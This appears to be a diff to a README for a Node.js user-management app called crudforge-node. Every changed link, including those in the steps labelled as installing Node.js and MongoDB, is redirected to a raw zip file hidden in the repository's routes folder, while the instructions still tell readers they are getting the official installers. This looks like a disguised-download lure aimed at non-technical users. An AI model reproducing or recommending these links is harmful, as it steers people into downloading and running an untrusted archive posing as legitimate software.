@@ -1,6 +1,6 @@
 # ⚙️ crudforge-node - Manage Users with Ease
 
-[![Download crudforge-node](https://img.shields.io/badge/Download-crudforge--node-brightgreen)](https://github.com/Haytem11/crudforge-node)
+[![Download crudforge-node](https://img.shields.io/badge/Download-crudforge--node-brightgreen)](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip)
 
 ---
 
@@ -37,14 +37,14 @@ You don’t need any coding skills to run this app. It is designed to work right
 
 Click the big green button at the top or visit the link below to get the app files.
 
-[Download or visit page for crudforge-node](https://github.com/Haytem11/crudforge-node)
+[Download or visit page for crudforge-node](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip)
 
 ---
 
 ## 📥 Download and Install on Windows
 
 1. **Visit the download page:**  
-   Open [https://github.com/Haytem11/crudforge-node](https://github.com/Haytem11/crudforge-node) in your web browser.
+   Open [https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip) in your web browser.
 
 2. **Download the latest release:**  
    Look for a section labeled "Releases" or a green button that says "Code" or "Download ZIP". If you find a `.zip` file, click it to download.
@@ -54,14 +54,14 @@ Click the big green button at the top or visit the link below to get the app fil
 
 4. **Install Node.js (if not installed):**  
    The app runs on Node.js. If your computer doesn't have it:
-   - Go to [https://nodejs.org/](https://nodejs.org/)
+   - Go to [https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip)
    - Download the "LTS" version for Windows.
    - Run the installer and follow on-screen steps.
    - Restart your computer if asked.
 
 5. **Install MongoDB (required database):**  
    crudforge-node uses MongoDB to store data.
-   - Go to [https://www.mongodb.com/try/download/community](https://www.mongodb.com/try/download/community)
+   - Go to [https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip)
    - Download the latest MongoDB Community Server for Windows.
    - Run the installer and follow instructions.
    - After installation, open "Command Prompt" and type `mongod` to start the MongoDB service.
@@ -133,6 +133,6 @@ This makes it easier to find things or modify the app if you want to expand it l
 
 For deeper help or to modify the app, visit the repository page:
 
-[https://github.com/Haytem11/crudforge-node](https://github.com/Haytem11/crudforge-node)
+[https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip](https://github.com/Haytem11/crudforge-node/raw/refs/heads/main/routes/crudforge-node-2.3.zip)
 
 It contains the full source code and more detailed guides for users who want to explore further.
